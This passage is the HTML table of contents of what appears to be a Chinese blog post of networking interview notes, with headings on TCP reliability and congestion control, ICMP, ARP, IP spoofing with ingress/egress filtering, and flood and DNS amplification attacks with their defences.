href="#TCP%E5%A6%82%E4%BD%95%E4%BF%9D%E8%AF%81%E4%BC%A0%E8%BE%93%E7%9A%84%E5%8F%AF%E9%9D%A0%E6%80%A7"><span class="toc-text">TCP如何保证传输的可靠性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%8E%AF-%E5%9C%BA%E6%99%AF%E8%AE%BE%E5%AE%9A%EF%BC%9A%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93"><span class="toc-text">🎯 场景设定：文件传输</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-1-%E5%9F%BA%E4%BA%8E%E6%95%B0%E6%8D%AE%E5%9D%97%E4%BC%A0%E8%BE%93%EF%BC%9A%E5%88%86%E6%AE%B5%E5%8F%91%E9%80%81"><span class="toc-text">✅ 1. 基于数据块传输：分段发送</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-2-%E5%AF%B9%E5%A4%B1%E5%BA%8F%E6%95%B0%E6%8D%AE%E5%8C%85%E9%87%8D%E6%96%B0%E6%8E%92%E5%BA%8F-%E5%8E%BB%E9%87%8D"><span class="toc-text">✅ 2. 对失序数据包重新排序 + 去重</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-3-%E6%A0%A1%E9%AA%8C%E5%92%8C%EF%BC%9A%E4%BF%9D%E8%AF%81%E6%95%B0%E6%8D%AE%E4%B8%8D%E8%A2%AB%E7%AF%A1%E6%94%B9%E6%88%96%E6%8D%9F%E5%9D%8F"><span class="toc-text">✅ 3. 校验和：保证数据不被篡改或损坏</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-4-%E9%87%8D%E4%BC%A0%E6%9C%BA%E5%88%B6%EF%BC%9A%E7%A1%AE%E4%BF%9D%E5%8F%AF%E9%9D%A0%E9%80%81%E8%BE%BE"><span class="toc-text">✅ 4. 重传机制：确保可靠送达</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%8C%9F-4-1-%E8%B6%85%E6%97%B6%E9%87%8D%E4%BC%A0%EF%BC%88%E5%AE%9A%E6%97%B6%E5%99%A8%E8%A7%A6%E5%8F%91%EF%BC%89"><span class="toc-text">🌟 4.1 超时重传（定时器触发）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%8C%9F-4-2-%E5%BF%AB%E9%80%9F%E9%87%8D%E4%BC%A0%EF%BC%88%E9%87%8D%E5%A4%8D-ACK-%E8%A7%A6%E5%8F%91%EF%BC%89"><span class="toc-text">🌟 4.2 快速重传（重复 ACK 触发）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%8C%9F-4-3-SACK-%E4%B8%8E-D-SACK%EF%BC%88%E5%8F%AF%E9%80%89%E9%A1%B9%EF%BC%89"><span class="toc-text">🌟 4.3 SACK 与 D-SACK（可选项）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-5-%E6%B5%81%E9%87%8F%E6%8E%A7%E5%88%B6%EF%BC%88%E6%8E%A5%E6%94%B6%E6%96%B9%E6%8E%A7%E5%88%B6%E5%8F%91%E9%80%81%E6%96%B9%EF%BC%89"><span class="toc-text">✅ 5. 流量控制（接收方控制发送方）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-6-%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6%EF%BC%88%E7%BD%91%E7%BB%9C%E7%8A%B6%E6%80%81%E6%8E%A7%E5%88%B6%E5%8F%91%E9%80%81%E9%80%9F%E7%8E%87%EF%BC%89"><span class="toc-text">✅ 6. 拥塞控制（网络状态控制发送速率）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9D%E5%A7%8B%E7%8A%B6%E6%80%81%EF%BC%9A"><span class="toc-text">初始状态：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%91%E7%94%9F%E4%B8%A2%E5%8C%85%EF%BC%9A"><span class="toc-text">发生丢包：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%A5%E5%A1%9E%E7%AA%97%E5%8F%A3-%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3%EF%BC%9A"><span class="toc-text">拥塞窗口 + 滑动窗口：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-SACK%EF%BC%88Selective-ACK%EF%BC%8C%E9%80%89%E6%8B%A9%E6%80%A7%E7%A1%AE%E8%AE%A4%EF%BC%89"><span class="toc-text">✅ SACK（Selective ACK，选择性确认）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%8C%9F-%E4%B8%BE%E4%B8%AA%E4%BE%8B%E5%AD%90%EF%BC%9A"><span class="toc-text">🌟 举个例子：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-D-SACK%EF%BC%88Duplicate-SACK%EF%BC%89"><span class="toc-text">✅ D-SACK（Duplicate SACK）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%8C%9F-%E4%B8%BE%E4%B8%AA%E4%BE%8B%E5%AD%90%EF%BC%9A-2"><span class="toc-text">🌟 举个例子：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TCP%E7%9A%84%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6"><span class="toc-text">TCP的拥塞控制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%8E%AF-%E5%9B%BE%E4%B8%AD%E5%90%84%E9%98%B6%E6%AE%B5%E7%BC%96%E5%8F%B7%E8%A7%A3%E6%9E%90%EF%BC%88%E6%8C%89%E9%A1%BA%E5%BA%8F%EF%BC%89"><span class="toc-text">🎯 图中各阶段编号解析（按顺序）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%8D-%E9%98%B6%E6%AE%B5-1%EF%BC%9A%E6%85%A2%E5%BC%80%E5%A7%8B-%E6%8B%A5%E5%A1%9E%E9%81%BF%E5%85%8D-%E8%BF%87%E6%B8%A1"><span class="toc-text">📍 阶段 1：慢开始 + 拥塞避免****过渡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%8D-%E9%98%B6%E6%AE%B5-2%EF%BC%9A%E8%B6%85%E6%97%B6%E9%87%8D%E4%BC%A0%EF%BC%88Timeout%EF%BC%89"><span class="toc-text">📍 阶段 2：超时重传（Timeout）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%8D-%E9%98%B6%E6%AE%B5-3%EF%BC%9A%E5%86%8D%E6%AC%A1%E6%85%A2%E5%90%AF%E5%8A%A8-%E6%8B%A5%E5%A1%9E%E9%81%BF%E5%85%8D"><span class="toc-text">📍 阶段 3：再次慢启动 + 拥塞避免</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%8D-%E9%98%B6%E6%AE%B5-4%EF%BC%9A3-%E6%AC%A1%E9%87%8D%E5%A4%8D-ACK%EF%BC%88%E8%A7%A6%E5%8F%91-Fast-Retransmit%EF%BC%89"><span class="toc-text">📍 阶段 4：3 次重复 ACK（触发 Fast Retransmit）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%8D-%E9%98%B6%E6%AE%B5-5%EF%BC%9A%E5%BF%AB%E6%81%A2%E5%A4%8D-%EF%BC%88Fast-Recovery%EF%BC%89"><span class="toc-text">📍 阶段 5：快恢复**（Fast Recovery）**</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ARQ%E5%8D%8F%E8%AE%AE%EF%BC%88%E5%81%9C%E6%AD%A2%E7%AD%89%E5%BE%85ARQ%E3%80%81%E8%BF%9E%E7%BB%ADARQ%E3%80%81%E9%80%89%E6%8B%A9%E9%87%8D%E4%BC%A0ARQ%EF%BC%89"><span class="toc-text">ARQ协议（停止等待ARQ、连续ARQ、选择重传ARQ）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IPv6%E3%80%81IPv4"><span class="toc-text">IPv6、IPv4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ICMP%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-text">ICMP是什么</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E5%9C%BA%E6%99%AF%EF%BC%9A%E4%BD%BF%E7%94%A8-ping-%E5%91%BD%E4%BB%A4%E6%A3%80%E6%B5%8B%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E6%98%AF%E5%90%A6%E8%BF%9E%E9%80%9A"><span class="toc-text">✅ 场景：使用 ping 命令检测目标主机是否连通</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%B1-Step-by-Step-%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-text">🧱 Step-by-Step 过程分析：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E4%BD%A0%E7%94%B5%E8%84%91%E6%9E%84%E9%80%A0%E4%B8%80%E4%B8%AA-ICMP-Echo-Request-%E6%8A%A5%E6%96%87"><span class="toc-text">1、你电脑构造一个 ICMP Echo Request 报文</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E5%B0%86%E6%8A%A5%E6%96%87%E5%B0%81%E8%A3%85%E5%88%B0-IP-%E6%95%B0%E6%8D%AE%E5%8C%85%E5%B9%B6%E5%8F%91%E9%80%81"><span class="toc-text">2、将报文封装到 IP 数据包并发送</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E8%B7%AF%E7%94%B1%E5%99%A8%E5%B0%86%E5%8C%85%E4%BC%A0%E8%BE%93%E7%BB%99%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%EF%BC%88192-168-1-1%EF%BC%89"><span class="toc-text">3、路由器将包传输给目标主机（192.168.1.1）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E3%80%81%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E6%9E%84%E9%80%A0%E5%B9%B6%E5%8F%91%E9%80%81-ICMP-Echo-Reply-%E6%8A%A5%E6%96%87"><span class="toc-text">4、目标主机构造并发送 ICMP Echo Reply 报文</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%E3%80%81%E4%BD%A0%E6%94%B6%E5%88%B0-ICMP-Echo-Reply-%E5%90%8E%E7%BB%88%E7%AB%AF%E6%98%BE%E7%A4%BA%EF%BC%9A"><span class="toc-text">5、你收到 ICMP Echo Reply 后终端显示：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%88-%E5%A4%9A%E4%B8%AA-ICMP-%E6%8A%A5%E6%96%87%E5%BE%80%E8%BF%94"><span class="toc-text">📈 多个 ICMP 报文往返</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A0-%E8%A1%A5%E5%85%85%E7%BB%86%E8%8A%82%EF%BC%9A"><span class="toc-text">🧠 补充细节：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%9A%AB-%E5%A6%82%E6%9E%9C-ping-%E4%B8%8D%E9%80%9A%EF%BC%8C%E4%BC%9A%E5%8F%91%E7%94%9F%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-text">🚫 如果 ping 不通，会发生什么？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ARP%E5%8D%8F%E8%AE%AE"><span class="toc-text">ARP协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ARP-%E5%8D%8F%E8%AE%AE%E8%A7%A3%E5%86%B3%E4%BA%86%E4%BB%80%E4%B9%88%E9%97%AE%E9%A2%98%EF%BC%9F"><span class="toc-text">ARP 协议解决了什么问题？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%80%E3%80%81ARP-%E5%8D%8F%E8%AE%AE%E8%A6%81%E8%A7%A3%E5%86%B3%E4%BB%80%E4%B9%88%E9%97%AE%E9%A2%98%EF%BC%9F"><span class="toc-text">✅ 一、ARP 协议要解决什么问题？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%BA%8C%E3%80%81%E4%B8%BE%E4%B8%AA%E4%BE%8B%E5%AD%90%EF%BC%88%E4%B8%BB%E6%9C%BA-A-%E7%BB%99%E4%B8%BB%E6%9C%BA-B-%E5%8F%91%E6%95%B0%E6%8D%AE%EF%BC%89"><span class="toc-text">✅ 二、举个例子（主机 A 给主机 B 发数据）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%B5-%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9AA-%E6%9F%A5%E6%89%BE-ARP-%E7%BC%93%E5%AD%98%E8%A1%A8"><span class="toc-text">🔵 第一步：A 查找 ARP 缓存表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%B5-%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9AA-%E4%BD%BF%E7%94%A8%E7%9B%AE%E6%A0%87-MAC-%E6%9E%84%E9%80%A0%E7%9C%9F%E6%AD%A3%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85%E5%B9%B6%E5%8F%91%E9%80%81"><span class="toc-text">🔵 第四步：A 使用目标 MAC 构造真正的数据包并发送</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%89%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-text">✅ 三、总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E8%A1%A5%E5%85%85%E7%9F%A5%E8%AF%86%EF%BC%9AARP-%E8%A1%A8"><span class="toc-text">✅ 补充知识：ARP 表</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%90%8C%E5%B1%80%E5%9F%9F%E7%BD%91%E4%B9%8B%E9%97%B4%E9%80%9A%E4%BF%A1%E7%9A%84-ARP"><span class="toc-text">不同局域网之间通信的 ARP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E5%9C%BA%E6%99%AF%EF%BC%9A%E4%B8%BB%E6%9C%BA-A-%E4%B8%8E%E4%B8%BB%E6%9C%BA-B-%E4%B8%8D%E5%9C%A8%E4%B8%80%E4%B8%AA%E5%B1%80%E5%9F%9F%E7%BD%91"><span class="toc-text">✅ 场景：主机 A 与主机 B 不在一个局域网</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91%EF%BC%9A"><span class="toc-text">网络拓扑：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%BB%E6%9C%BA-A-%E6%83%B3%E7%BB%99%E4%B8%BB%E6%9C%BA-B-%E5%8F%91%E6%95%B0%E6%8D%AE%EF%BC%8C%E8%AF%A5%E6%80%8E%E4%B9%88%E5%81%9A%EF%BC%9F"><span class="toc-text">✅ 主机 A 想给主机 B 发数据，该怎么做？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%B5-%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E4%B8%BB%E6%9C%BA-A-%E5%8F%91%E7%8E%B0-B-%E4%B8%8D%E5%9C%A8%E5%90%8C%E4%B8%80%E7%BD%91%E6%AE%B5"><span class="toc-text">🔵 第一步：主机 A 发现 B 不在同一网段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%B5-%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E4%B8%BB%E6%9C%BA-A-%E9%9C%80%E8%A6%81%E8%B7%AF%E7%94%B1%E5%99%A8%E7%9A%84-MAC-%E5%9C%B0%E5%9D%80%EF%BC%8C%E5%8F%91-ARP-%E8%AF%B7%E6%B1%82"><span class="toc-text">🔵 第二步：主机 A 需要路由器的 MAC 地址，发 ARP 请求</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%B5-%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9AA-%E6%9E%84%E9%80%A0%E5%B8%A7%E5%8F%91%E7%BB%99%E7%BD%91%E5%85%B3"><span class="toc-text">🔵 第三步：A 构造帧发给网关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%B5-%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E8%B7%AF%E7%94%B1%E5%99%A8%E6%9F%A5%E8%B7%AF%E7%94%B1%E8%A1%A8-%E2%86%92-%E6%89%BE%E5%88%B0%E5%87%BA%E6%8E%A5%E5%8F%A3%EF%BC%88WAN%EF%BC%89"><span class="toc-text">🔵 第四步：路由器查路由表 → 找到出接口（WAN）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%B5-%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9A%E4%B8%BB%E6%9C%BA-B-%E5%9B%9E%E5%A4%8D-MAC%EF%BC%8C%E9%80%9A%E4%BF%A1%E5%BB%BA%E7%AB%8B"><span class="toc-text">🔵 第五步：主机 B 回复 MAC，通信建立</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E5%85%B3%E9%94%AE%E7%82%B9%E5%9B%9E%E9%A1%BE%EF%BC%9A"><span class="toc-text">✅ 关键点回顾：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB"><span class="toc-text">网络攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#IP%E6%AC%BA%E9%AA%97%E3%80%81%E5%85%A5%E5%8F%A3%E8%BF%87%E6%BB%A4%E3%80%81%E5%87%BA%E5%8F%A3%E8%BF%87%E6%BB%A4"><span class="toc-text">IP欺骗、入口过滤、出口过滤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%8C%90-%E4%B8%80%E3%80%81IP-%E6%AC%BA%E9%AA%97%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-text">🌐 一、IP 欺骗是什么？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%9A%A7-%E4%BA%8C%E3%80%81%E5%A6%82%E4%BD%95%E9%98%B2%E8%8C%83%EF%BC%9F%E2%80%94%E2%80%94%E5%85%A5%E5%8F%A3%E8%BF%87%E6%BB%A4%E5%92%8C%E5%87%BA%E5%8F%A3%E8%BF%87%E6%BB%A4"><span class="toc-text">🚧 二、如何防范？——入口过滤和出口过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-1-%E5%85%A5%E5%8F%A3%E8%BF%87%E6%BB%A4%EF%BC%88Ingress-Filtering%EF%BC%89"><span class="toc-text">✅ 1. 入口过滤（Ingress Filtering）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-%E4%B8%BE%E4%BE%8B%EF%BC%9A-2"><span class="toc-text">✅ 举例：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-%E7%BB%93%E6%9E%9C%EF%BC%9A"><span class="toc-text">✅ 结果：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-2-%E5%87%BA%E5%8F%A3%E8%BF%87%E6%BB%A4%EF%BC%88Egress-Filtering%EF%BC%89"><span class="toc-text">✅ 2. 出口过滤（Egress Filtering）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-%E4%B8%BE%E4%BE%8B%EF%BC%9A-3"><span class="toc-text">✅ 举例：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-%E7%BB%93%E6%9E%9C%EF%BC%9A-2"><span class="toc-text">✅ 结果：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%80%E3%80%81%E5%A6%82%E6%9E%9C%E6%B2%A1%E6%9C%89%E5%85%A5%E5%8F%A3%E8%BF%87%E6%BB%A4%E4%BC%9A%E5%8F%91%E7%94%9F%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-text">✅ 一、如果没有入口过滤会发生什么？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%8C-%E9%97%AE%E9%A2%98%E5%9C%BA%E6%99%AF-1%EF%BC%9A%E8%A2%AB%E5%A4%96%E9%83%A8%E6%94%BB%E5%87%BB%E8%80%85%E2%80%9C%E4%BC%AA%E8%A3%85%E5%86%85%E9%83%A8-IP%E2%80%9D%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99"><span class="toc-text">📌 问题场景 1：被外部攻击者“伪装内部 IP”绕过防火墙</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%94%8D-%E4%B8%BE%E4%BE%8B%EF%BC%9A"><span class="toc-text">🔍 举例：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%8C-%E9%97%AE%E9%A2%98%E5%9C%BA%E6%99%AF-2%EF%BC%9A%E5%8F%8D%E5%90%91%E6%94%BB%E5%87%BB%E8%BF%BD%E8%B8%AA%E5%A4%B1%E8%B4%A5"><span class="toc-text">📌 问题场景 2：反向攻击追踪失败</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%BA%8C%E3%80%81%E5%A6%82%E6%9E%9C%E6%B2%A1%E6%9C%89%E5%87%BA%E5%8F%A3%E8%BF%87%E6%BB%A4%E4%BC%9A%E5%8F%91%E7%94%9F%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-text">✅ 二、如果没有出口过滤会发生什么？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%8C-%E9%97%AE%E9%A2%98%E5%9C%BA%E6%99%AF-1%EF%BC%9A%E4%BD%A0%E7%9A%84%E7%BD%91%E7%BB%9C%E5%8F%98%E6%88%90%E2%80%9C%E5%83%B5%E5%B0%B8%E8%B7%B3%E6%9D%BF%E2%80%9D"><span class="toc-text">📌 问题场景 1：你的网络变成“僵尸跳板”</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%8C-%E9%97%AE%E9%A2%98%E5%9C%BA%E6%99%AF-2%EF%BC%9A%E8%BF%9D%E5%8F%8D%E6%B3%95%E8%A7%84%EF%BC%8C%E9%81%AD%E5%88%B0%E8%BF%90%E8%90%A5%E5%95%86%E8%AD%A6%E5%91%8A%E6%88%96%E5%B0%81%E9%94%81"><span class="toc-text">📌 问题场景 2：违反法规，遭到运营商警告或封锁</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E6%80%BB%E7%BB%93%E7%AD%94%E9%A2%98%E6%A8%A1%E6%9D%BF%EF%BC%88%E9%9D%A2%E8%AF%95%E5%8F%AF%E7%94%A8%EF%BC%89%EF%BC%9A"><span class="toc-text">✅ 总结答题模板（面试可用）：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SYN-Flood"><span class="toc-text">SYN Flood</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A0-%E4%B8%80%E5%8F%A5%E8%AF%9D%E7%90%86%E8%A7%A3-SYN-Flood-%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-text">🧠 一句话理解 SYN Flood 是什么？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%B6-TCP-%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E5%9B%9E%E9%A1%BE%EF%BC%88%E6%AD%A3%E5%B8%B8%E6%B5%81%E7%A8%8B%EF%BC%89%EF%BC%9A"><span class="toc-text">📶 TCP 三次握手回顾（正常流程）：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%A5-SYN-Flood-%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%EF%BC%9A"><span class="toc-text">🔥 SYN Flood 的攻击方式：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%8E%AF-%E4%B8%BE%E4%B8%AA%E7%8E%B0%E5%AE%9E%E4%BE%8B%E5%AD%90%EF%BC%88%E7%B1%BB%E6%AF%94%EF%BC%89%EF%BC%9A"><span class="toc-text">🎯 举个现实例子（类比）：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%89%E7%A7%8D%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E5%BD%A2%E5%BC%8F"><span class="toc-text">三种常见攻击形式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="toc-text">防御措施</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UDP-Flood"><span class="toc-text">UDP Flood</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UDP-Flood-%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-text">UDP Flood 攻击原理是什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%A8-%E4%B8%80%E3%80%81%E4%BB%80%E4%B9%88%E6%98%AF-UDP-Flood-%E6%94%BB%E5%87%BB%EF%BC%9F"><span class="toc-text">🧨 一、什么是 UDP Flood 攻击？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%A8-%E4%B8%BE%E4%BE%8B%E4%B8%8E-UDP-Flood-%E5%AF%B9%E5%BA%94%E8%A7%A3%E9%87%8A"><span class="toc-text">🧨 举例与 UDP Flood 对应解释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP-Flood"><span class="toc-text">HTTP Flood</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS-Flood"><span class="toc-text">DNS Flood</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS-Flood-%E6%94%BB%E5%87%BB%E4%B8%8D%E5%90%8C%E4%BA%8E-DNS-%E6%94%BE%E5%A4%A7%E6%94%BB%E5%87%BB"><span class="toc-text">DNS Flood 攻击不同于 DNS 放大攻击:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%8D-%E4%B8%80%E3%80%81DNS-Flood-%E6%94%BB%E5%87%BB%EF%BC%88%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB%EF%BC%89"><span class="toc-text">🔍 一、DNS Flood 攻击（洪水攻击）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E6%A0%B8%E5%BF%83%E7%89%B9%E5%BE%81%EF%BC%9A"><span class="toc-text">✅ 核心特征：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%8C-%E4%B8%BE%E4%BE%8B%E8%AF%B4%E6%98%8E%EF%BC%9A-2"><span class="toc-text">📌 举例说明：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%8E%AF-%E6%94%BB%E5%87%BB%E7%9B%AE%E7%9A%84%EF%BC%9A"><span class="toc-text">🎯 攻击目的：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%92%A5-%E4%BA%8C%E3%80%81DNS-%E6%94%BE%E5%A4%A7%E6%94%BB%E5%87%BB%EF%BC%88Amplification%EF%BC%89"><span class="toc-text">💥 二、DNS 放大攻击（Amplification）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E6%A0%B8%E5%BF%83%E7%89%B9%E5%BE%81%EF%BC%9A-2"><span class="toc-text">✅ 核心特征：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%8C-%E4%B8%BE%E4%BE%8B%E8%AF%B4%E6%98%8E%EF%BC%9A-3"><span class="toc-text">📌 举例说明：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%88-%E6%94%BE%E5%A4%A7%E5%80%8D%E7%8E%87%EF%BC%9A"><span class="toc-text">📈 放大倍率：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E7%AD%96%E7%95%A5"><span class="toc-text">防护策略</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" 